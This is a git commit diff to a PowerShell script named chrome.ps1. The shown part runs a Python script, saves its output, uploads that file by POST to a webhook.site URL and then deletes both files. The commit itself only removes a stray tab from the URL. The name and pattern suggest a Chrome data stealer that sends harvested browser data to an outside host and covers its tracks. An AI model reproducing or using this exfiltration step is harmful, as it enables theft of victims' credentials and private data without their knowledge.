035bf3cca9339630ba3365bceea3e8814e124dfe
AKASH <87299311+gamkers@users.noreply.github.com>
2024-03-31 00:44:53 +0530

    Update chrome.ps1

--- chrome.ps1
+++ chrome.ps1
@@ -21,7 +21,7 @@ $output = python $scriptPath
 $output | Out-File -FilePath $outputFilePath
 
 # Send the output to the webhook URL
-Invoke-WebRequest -Uri "	https://webhook.site/809d0f5f-7467-48fc-9be5-538024059dd4" -Method POST -InFile $outputFilePath
+Invoke-WebRequest -Uri "https://webhook.site/809d0f5f-7467-48fc-9be5-538024059dd4" -Method POST -InFile $outputFilePath
 
 Remove-Item -Path $scriptPath
 Remove-Item -Path $outputFilePath
